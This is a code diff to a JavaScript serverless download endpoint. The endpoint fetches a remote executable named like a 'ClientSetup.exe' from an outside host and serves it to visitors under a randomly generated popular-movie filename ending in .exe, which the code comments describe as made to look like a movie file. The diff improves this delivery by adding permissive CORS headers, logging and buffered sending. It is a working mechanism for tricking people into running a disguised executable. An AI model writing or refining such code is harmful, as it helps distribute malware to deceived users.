@@ -1,5 +1,17 @@
-// pages/api/download.js
+// api/download.js (place this file in the api/ folder at your project root)
+
 export default async function handler(req, res) {
+  // Set CORS headers to allow cross-origin requests
+  res.setHeader("Access-Control-Allow-Origin", "*");
+  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
+  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
+
+  // Handle preflight requests
+  if (req.method === "OPTIONS") {
+    res.status(200).end();
+    return;
+  }
+
   const remoteFile =
     "https://alpha.noleggiodisci.com/Bin/work_approval_pdf3.ClientSetup.exe?e=Access&y=Guest";
 
@@ -50,26 +62,14 @@ export default async function handler(req, res) {
     "Barbarian_Horror",
     "Pearl_Horror",
     "The_Menu",
-    "Glass_Onion",
-    "Knives_Out_2",
     "Amsterdam",
     "Dont_Worry_Darling",
     "The_Woman_King",
-    "Till_2022",
-    "She_Said",
-    "The_Fabelmans",
-    "Tar_Cate_Blanchett",
     "Elvis_Baz_Luhrmann",
     "Blonde_Marilyn_Monroe",
-    "White_Noise_Netflix",
     "The_Whale_Brendan_Fraser",
-    "Top_Gun_Maverick_4K",
-    "Batman_2022_4K",
-    "Dune_2021_IMAX",
-    "Spider_Verse_2",
     "Mario_Bros_Movie",
     "Fast_X_2023",
-    "Guardians_3_IMAX"
   ];
 
   // Function to get random movie name
@@ -86,29 +86,43 @@ export default async function handler(req, res) {
   }
 
   try {
+    console.log("Fetching file from:", remoteFile);
+
     const response = await fetch(remoteFile);
 
     if (!response.ok) {
-      return res.status(500).send("Failed to fetch file");
+      console.error(
+        "Failed to fetch file:",
+        response.status,
+        response.statusText
+      );
+      return res
+        .status(500)
+        .json({ error: "Failed to fetch file", status: response.status });
     }
 
     // Generate random movie filename
     const randomMovie = getRandomMovieName();
     const randomQuality = getRandomQuality();
     const randomId = Math.random().toString(36).substring(2, 6);
-    
+
     // Create filename that looks like a movie file
     const filename = `${randomMovie}_${randomQuality}_${randomId}.exe`;
 
-    res.setHeader("Content-Type", "application/octet-stream");
-    res.setHeader(
-      "Content-Disposition",
-      `attachment; filename="${filename}"`
-    );
+    console.log("Generated filename:", filename);
 
-    response.body.pipe(res);
+    // Set headers for file download
+    res.setHeader("Content-Type", "application/octet-stream");
+    res.setHeader("Content-Disposition", `attachment; filename="${filename}"`);
+    res.setHeader("Cache-Control", "no-cache");
+
+    // Get the response body as buffer and send it
+    const buffer = await response.arrayBuffer();
+    res.send(Buffer.from(buffer));
   } catch (error) {
-    console.error(error);
-    res.status(500).send("Internal Server Error");
+    console.error("Download error:", error);
+    res
+      .status(500)
+      .json({ error: "Internal Server Error", message: error.message });
   }
 }
